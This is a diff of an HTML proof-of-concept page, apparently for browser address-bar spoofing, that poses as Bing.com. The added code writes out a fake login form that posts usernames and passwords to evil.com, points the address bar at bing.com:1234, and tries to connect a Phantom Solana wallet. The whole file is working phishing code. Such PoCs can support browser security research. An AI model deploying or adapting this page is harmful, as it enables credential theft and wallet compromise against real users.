@@ -3,39 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Address Bar Spoof PoC</title>
+    <title>Bing.com</title>
     <script>
-        // Spoof function to inject a fake form and spoof the address bar
-        function spoof() { 
-            document.location = "https://bing.com:1234"; 
-            setInterval(function() {
-                document.location = "https://bing.com:1234";
-            }, 9800); 
-        }
+        function spoof() {
+            // Simulate a legitimate-looking page
+            document.write("<html><title>Bing.com</title><form Method=POST Action=//evil.com Name=form><br /><br />Login:<br/><input name=login><br />Password:<br/><input name=Password type=password><br/><br/><input type=submit name=Valid value=Ok></form></html>");  
 
-        // Trigger spoofing after a delay
-        window.onload = () => {
-            setTimeout(spoof, 10000);
-        };
+            // Change the address bar to spoof Bing.com
+            document.location = "https://bing.com:1234";
 
-        // Wallet connection logic
-        async function attemptWalletConnection() {
+            // Attempt to interact with Phantom Wallet
             try {
-                if (window.phantom && window.phantom.solana) {
-                    const connection = await window.phantom.solana.connect();
-                    alert(`Wallet connected! Public key: ${connection.publicKey}`);
-                } else {
-                    alert("Phantom wallet not detected.");
-                }
-            } catch (error) {
-                alert(`Error: ${error.message}`);
+                setTimeout(() => {
+                    if (window.phantom && window.phantom.solana) {
+                        window.phantom.solana.connect().then((response) => {
+                            console.log("Connection successful:", response);
+                        }).catch((error) => {
+                            console.error("Connection failed:", error);
+                        });
+                    } else {
+                        console.error("Phantom Wallet not detected");
+                    }
+                }, 1000);
+            } catch (e) {
+                console.error("Error attempting interaction:", e);
             }
         }
     </script>
 </head>
 <body>
-    <h1>Welcome to Bing</h1>
-    <p>Click the button below to connect your wallet:</p>
-    <button onclick="attemptWalletConnection()">Connect Wallet</button>
+    <input type="button" value="Run test case" onclick="spoof();" />
 </body>
 </html>
